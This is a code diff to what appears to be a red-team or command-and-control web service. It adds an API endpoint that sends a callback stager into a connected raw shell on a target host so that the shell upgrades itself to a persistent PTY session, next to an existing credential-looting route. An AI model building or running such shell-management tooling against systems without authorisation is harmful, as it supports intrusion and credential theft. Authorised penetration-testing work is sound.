@@ -86,6 +86,27 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
         return {"id": session_id, "host_ip": sess.host_ip,
                 "data": base64.b64encode(data).decode()}
 
+    @app.post("/api/sessions/{session_id}/upgrade")
+    async def upgrade(session_id: str):
+        """Auto-pivot: push a reconnecting-PTY stager into a RAW shell so it upgrades itself
+        into a robust session — no manual stabilize dance ('shell of a shell')."""
+        import uuid
+        from ...sessions.stagers import upgrade_command
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        if sess.pty:
+            raise HTTPException(400, "already a robust PTY session")
+        if not sess.connected:
+            raise HTTPException(409, "shell is not currently connected")
+        if not sess.local_addr or not sess.local_addr[1]:
+            raise HTTPException(409, "cannot determine a callback address for this shell")
+        lhost, port = sess.local_addr            # the exact endpoint the target already reached
+        token = "up_" + uuid.uuid4().hex[:12]
+        await sess.send(upgrade_command(lhost, port, token).encode() + b"\n")
+        broker.publish({"type": "session", "event": "upgrading", "id": sess.id})
+        return {"ok": True, "callback": f"{lhost}:{port}"}
+
     @app.post("/api/sessions/{session_id}/cred")
     def loot_cred(session_id: str, body: dict = Body(...),
                   x_tester: str = Header(default="someone")):
